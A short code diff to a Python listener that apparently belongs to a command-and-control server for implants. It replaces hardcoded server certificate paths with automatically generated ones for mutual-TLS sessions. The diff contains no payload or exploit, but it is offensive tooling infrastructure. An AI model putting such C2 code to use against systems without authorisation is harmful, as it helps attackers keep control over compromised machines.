@@ -6,6 +6,7 @@ import ssl
 import threading
 import uuid
 import sys
+from certs.certs import Certs
 from pb import implantpb_pb2
 from queue import Queue
 
@@ -43,15 +44,16 @@ class Sessions:
 class Listener:
     def __init__(self, requestq: Queue):
         self.sessions = Sessions()
+        # Automatically generate CA certificates for the server
+        self.certs = Certs("server")
 
-        certfile = "../certs/server/avocado-server.c2.pem"
-        keyfile = "../certs/server/avocado-server.c2-key.pem"
+        # TODO: Don't hardcode the client certificates
         client_cert = "../certs/client/rootCA.pem"
 
         # mTLS settings
         ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         ctx.verify_mode = ssl.CERT_REQUIRED
-        ctx.load_cert_chain(certfile, keyfile)
+        ctx.load_cert_chain(certfile=self.certs.public_key, keyfile=self.certs.private_key)
         ctx.load_verify_locations(cafile=client_cert)
         # ctx.post_handshake_auth = True
 
